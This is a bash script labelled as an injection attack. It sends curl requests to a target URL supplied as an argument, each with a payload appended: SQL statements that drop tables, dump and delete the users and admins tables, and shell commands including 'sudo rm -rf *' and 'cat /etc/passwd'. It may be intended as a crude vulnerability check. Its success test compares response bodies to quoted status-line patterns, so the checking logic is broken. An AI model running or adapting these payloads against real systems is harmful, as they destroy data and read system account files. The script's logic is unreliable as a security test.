#!/usr/bin/env bash


# message
echo "Starting Injection attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

# make a single requests to perform SQL injection attack
HOST1="$1/;drop *;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;select * from users where name like '*admin*' or name like '*root*';"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;select * from admins limit 1;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;delete from users;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;delete from admins;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;delete from users;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;select * from users;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

sleep 5s;

HOST1="$1/;sudo rm -rf *;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;ls -la;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;ls -ll;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;ls -l;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;ls -a;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

HOST1="$1/;cat /etc/passwd;"
RESP1=$(curl "$HOST1")

echo "$HOST1"
sleep 5s;

if [ "$RESP1" == "HTTP/1.1 200*" ] || [ "$RESP1" == "HTTP/1.1 202*" ]
then
  echo "Got $RESP1";
  exit 0;
fi

echo "Secure on Injection attacks."

exit 1;